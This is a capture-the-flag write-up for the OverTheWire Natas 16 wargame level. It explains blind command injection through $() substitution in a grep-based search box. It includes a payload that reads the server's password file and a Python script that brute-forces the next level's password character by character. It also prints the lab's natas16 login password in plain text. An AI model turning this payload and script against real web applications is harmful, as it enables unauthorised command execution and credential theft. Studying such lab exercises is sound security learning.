# 🧪 Natas 16

## 🎯 Objective
Obtain the password for **Natas 17**.

---

## 👀 Observation
- Website provides a search input similar to **Natas 9 and Natas 10**.
- Backend behaviour suggests execution of a `grep` command.
- Certain characters are filtered to prevent direct command injection.
- Output behaviour changes depending on whether a match is found.

---

## 🚨 Vulnerability
**Type:**  
- Command Injection (blind / ouput-based)    

**Root Cause:**  
User input is embedded into a shell command without proper sanitization.
Although direct command injection characters are filterd, **command substitution (`$()`)** is still allowed,
enabling attackers to execute additional commands in a blind manner.

---

## 🛠️ Exploitation Steps
1. Tested normal input to confirm `grep`-based backend behaviour.
2. Identified that direct output from injected commands is not shown.
3. Observed that output **disappears when `grep` finds no match**.
4. Used **command substitution** to conditionally execute `grep` on the password file.
5. Crafted a payload that checks whether the password starts with a given prefix.
6. Noted the behaviour:
   - Output visible -> prefix is **incorrect**
   - No output -> prefix is **correct**
7. Automated this process usind a **Python script** to brute-force the password character by character.
8. Recovered the full password for **Natas 17**.

---

## 💻 Key Payload / Command
```bash
anything$(grep ^Prefix /etc/natas_webpass/natas17)
```
Where:
- `Prefix` is the currently tested password prefix.
- `^` ensures matching from the beginning of the password.

---

## 📜 Script
```python
import requests
import time
from string import ascii_lowercase, ascii_uppercase, digits

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()

seen_password = []

while len(seen_password) < 32:
    found = False
    for character in characters:
        attempt = ''.join(seen_password) + character
        payload = f'anythings$(grep ^{attempt} /etc/natas_webpass/natas17)'
        try:
            response = session.post(
                url,
                data={'needle': payload},
                auth=(username, password),
                timeout=10
            )
            content = response.text
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            time.sleep(1)
            continue
        if 'anythings' not in content:
            # grep matched → no change → correct char
            seen_password.append(character)
            print(f"[+] Found so far: {''.join(seen_password)}")
            found = True
            break
        time.sleep(0.1)

    if not found:
        print("[-] No matching character found. This shouldn't happen!")
        break
print(f"[✓] Final password: {''.join(seen_password)}")
```
---

## 📖 Key Takeaways
- Blocking obvious metacharacters does **not** prevent command injection.
- `$()` enables **command substitution,** even when output is not directly visible.
- Blind command injection can leak secrets through **behavioral differences**.
- Automation is essential when exploiting character-by-character leaks.
  
---

## 🖼️ Screenshots 
<img width="584" height="416" alt="image" src="https://github.com/user-attachments/assets/6f4fabdb-dfc8-4658-a63a-57014a1acd19" />
<img width="1384" height="914" alt="image" src="https://github.com/user-attachments/assets/7327ca80-3bf5-4266-9971-74790e0dd22c" /> <br>

*Password redacted for ethical reasons*
